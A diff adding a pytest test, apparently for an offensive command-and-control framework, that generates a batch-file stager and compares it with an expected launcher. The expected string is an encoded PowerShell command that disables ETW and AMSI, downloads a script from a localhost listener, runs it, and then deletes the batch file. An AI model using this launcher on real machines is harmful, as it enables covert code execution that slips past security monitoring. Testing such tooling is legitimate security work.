@@ -1,3 +1,5 @@
+from textwrap import dedent
+
 import pytest
 
 
@@ -410,3 +412,54 @@ def test_pyinstaller_stager_creation(client, pyinstaller_stager, admin_auth_head
     assert len(response.content) > 0
 
     client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
+
+
+def test_bat_stager_creation(client, bat_stager, admin_auth_header):
+    response = client.post(
+        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=bat_stager
+    )
+
+    # Check if the stager is successfully created
+    assert response.status_code == 201
+    assert response.json()["id"] != 0
+
+    stager_id = response.json()["id"]
+
+    response = client.get(
+        f"/api/v2/stagers/{stager_id}",
+        headers=admin_auth_header,
+    )
+
+    # Check if we can successfully retrieve the stager
+    assert response.status_code == 200
+    assert response.json()["id"] == stager_id
+
+    response = client.get(
+        response.json()["downloads"][0]["link"],
+        headers=admin_auth_header,
+    )
+
+    # Check if the file is downloaded successfully
+    assert response.status_code == 200
+    assert (
+        response.headers.get("content-type").split(";")[0]
+        == "application/x-msdos-program"
+    )
+    assert isinstance(response.content, bytes)
+
+    # Check if the downloaded file is not empty
+    assert len(response.content) > 0
+    assert response.content.decode("utf-8") == _expected_http_bat_launcher()
+
+    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
+
+
+def _expected_http_bat_launcher():
+    return dedent(
+        """
+        @echo off
+        start /B powershell.exe -nop -ep bypass -w 1 -enc WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAEUAdgBlAG4AdABpAG4AZwAuAEUAdgBlAG4AdABQAHIAbwB2AGkAZABlAHIAXQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAbQBfAGUAbgBhAGIAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABJAG4AcwB0AGEAbgBjAGUAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFQAcgBhAGMAaQBuAGcALgBQAFMARQB0AHcATABvAGcAUAByAG8AdgBpAGQAZQByACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAZQB0AHcAUAByAG8AdgBpAGQAZQByACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACkALAAwACkAOwAkAFIAZQBmAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AHYAYQBsAHUAZQAoACQATgB1AGwAbAAsACQAdAByAHUAZQApADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwBpAHcAcgAoACcAaAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADEAMwAzADYALwBkAG8AdwBuAGwAbwBhAGQALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8AJwApAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAfABpAGUAeAA=
+        timeout /t 1 > nul
+        del "%~f0"
+        """
+    ).strip()
